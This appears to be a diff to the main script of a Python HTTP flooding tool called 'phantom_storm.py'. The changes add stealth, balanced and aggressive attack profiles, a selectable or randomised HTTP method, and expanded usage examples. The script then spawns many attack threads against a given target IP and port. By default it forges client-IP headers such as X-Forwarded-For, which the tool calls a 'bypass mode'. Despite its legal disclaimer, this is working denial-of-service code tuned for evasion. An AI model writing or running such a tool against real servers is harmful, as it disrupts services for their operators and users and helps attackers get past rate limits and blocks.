@@ -33,10 +33,12 @@ from src import (
     AttackWorker,
     AttackStatistics,
     IPGenerator,
+    HTTPMethod,
     Colors,
     setup_logging,
     config
 )
+from src.core import AttackProfiles, ProfileType
 
 # ============================================================================
 # BANNER & UI
@@ -61,7 +63,7 @@ def print_banner():
     print(banner)
     
     disclaimer = f"""{Colors.WARNING}
-   {Colors.BOLD}⚠️  LEGAL DISCLAIMER ⚠️{Colors.ENDC}{Colors.WARNING}
+   {Colors.BOLD}WARNING - LEGAL DISCLAIMER - WARNING{Colors.ENDC}{Colors.WARNING}
    
    This tool is intended ONLY for authorized security testing in controlled
    lab environments. You MUST have explicit written permission to test any
@@ -157,23 +159,80 @@ def main():
     if len(sys.argv) < 4:
         print(f"{Colors.FAIL}[ERROR] Invalid arguments!{Colors.ENDC}\n")
         print(f"{Colors.OKBLUE}Usage:{Colors.ENDC}")
-        print(f"  python phantom_storm.py [Target_IP] [Port] [Threads] [--no-spoof]\n")
-        print(f"{Colors.OKBLUE}Example:{Colors.ENDC}")
+        print(f"  python phantom_storm.py [Target_IP] [Port] [Threads] [Options]\n")
+        print(f"{Colors.OKBLUE}Options:{Colors.ENDC}")
+        print(f"  --profile=PROFILE  Use predefined profile (stealth, balanced, aggressive)")
+        print(f"  --no-spoof         Disable IP spoofing")
+        print(f"  --method=METHOD    HTTP method (GET, POST, HEAD, OPTIONS, PUT, DELETE)")
+        print(f"  --random-method    Use random HTTP method for each request\n")
+        print(f"{Colors.OKBLUE}Examples:{Colors.ENDC}")
         print(f"  python phantom_storm.py 192.168.1.100 80 200")
-        print(f"  python phantom_storm.py 192.168.1.100 80 200 --no-spoof  {Colors.WARNING}(disable IP spoofing){Colors.ENDC}\n")
+        print(f"  python phantom_storm.py 192.168.1.100 80 200 --profile=stealth")
+        print(f"  python phantom_storm.py 192.168.1.100 80 200 --profile=aggressive")
+        print(f"  python phantom_storm.py 192.168.1.100 80 200 --no-spoof --method=POST\n")
         sys.exit(1)
     
     target_ip = sys.argv[1]
     target_port = int(sys.argv[2])
     threads_count = int(sys.argv[3])
     
-    # Check for --no-spoof flag
+    # Parse options - check for profile first
+    profile = None
     use_spoofing = True
-    if len(sys.argv) > 4 and sys.argv[4] == '--no-spoof':
-        use_spoofing = False
-        print(f"{Colors.WARNING}[!] IP Spoofing DISABLED{Colors.ENDC}")
+    http_method = HTTPMethod.GET
+    randomize_method = False
+    
+    for arg in sys.argv[4:]:
+        if arg.startswith('--profile='):
+            profile_name = arg.split('=')[1].lower()
+            if profile_name == 'stealth':
+                profile = AttackProfiles.get_stealth()
+            elif profile_name == 'balanced':
+                profile = AttackProfiles.get_balanced()
+            elif profile_name == 'aggressive':
+                profile = AttackProfiles.get_aggressive()
+            else:
+                print(f"{Colors.FAIL}[ERROR] Invalid profile: {profile_name}{Colors.ENDC}")
+                print(f"Valid profiles: stealth, balanced, aggressive\n")
+                sys.exit(1)
+    
+    # If profile is set, use profile settings
+    if profile:
+        threads_count = profile.threads
+        use_spoofing = profile.use_spoofing
+        http_method = profile.http_method if profile.http_method else HTTPMethod.GET
+        randomize_method = profile.randomize_method
+        
+        print(f"\n{Colors.OKCYAN}{'='*80}")
+        print(f"{Colors.BOLD}USING ATTACK PROFILE: {profile.name.upper()}{Colors.ENDC}{Colors.OKCYAN}")
+        print(f"{'='*80}{Colors.ENDC}")
+        print(profile.display_info())
     else:
+        # Parse other options
+        for arg in sys.argv[4:]:
+            if arg == '--no-spoof':
+                use_spoofing = False
+            elif arg.startswith('--method='):
+                method_name = arg.split('=')[1].upper()
+                try:
+                    http_method = HTTPMethod[method_name]
+                except KeyError:
+                    print(f"{Colors.FAIL}[ERROR] Invalid method: {method_name}{Colors.ENDC}")
+                    print(f"Valid methods: GET, POST, HEAD, OPTIONS, PUT, DELETE\n")
+                    sys.exit(1)
+            elif arg == '--random-method':
+                randomize_method = True
+    
+    # Display config
+    if use_spoofing:
         print(f"{Colors.OKGREEN}[+] IP Spoofing ENABLED - Bypass mode active!{Colors.ENDC}")
+    else:
+        print(f"{Colors.WARNING}[!] IP Spoofing DISABLED{Colors.ENDC}")
+    
+    if randomize_method:
+        print(f"{Colors.OKCYAN}[+] HTTP Method: RANDOM (GET/POST/HEAD/OPTIONS){Colors.ENDC}")
+    else:
+        print(f"{Colors.OKCYAN}[+] HTTP Method: {http_method.value}{Colors.ENDC}")
     
     # Authorization check
     if not get_user_confirmation():
@@ -205,15 +264,28 @@ def main():
     if use_spoofing:
         print(f"{Colors.OKCYAN}[*] Each connection will use unique spoofed IP{Colors.ENDC}")
         print(f"{Colors.OKCYAN}[*] Bypass headers: X-Forwarded-For, X-Real-IP, Client-IP, Via, etc.{Colors.ENDC}")
+    if randomize_method:
+        print(f"{Colors.OKCYAN}[*] Using random HTTP methods for each request{Colors.ENDC}")
+    else:
+        print(f"{Colors.OKCYAN}[*] Using HTTP method: {http_method.value}{Colors.ENDC}")
     print(f"{Colors.OKGREEN}[*] Log file: logs/{log_filename}{Colors.ENDC}")
     print(f"{Colors.WARNING}[*] Press Ctrl+C to stop{Colors.ENDC}")
     
     logging.info(f"Spawning {threads_count} attack threads")
+    logging.info(f"HTTP Method: {'RANDOM' if randomize_method else http_method.value}")
     
     # Create và start workers
     workers = []
     for i in range(threads_count):
-        worker = AttackWorker(target_ip, target_port, stats, worker_id=i, use_spoofing=use_spoofing)
+        worker = AttackWorker(
+            target_ip, 
+            target_port, 
+            stats, 
+            worker_id=i, 
+            use_spoofing=use_spoofing,
+            http_method=http_method,
+            randomize_method=randomize_method
+        )
         thread = threading.Thread(target=worker.run, daemon=True)
         thread.start()
         workers.append(worker)
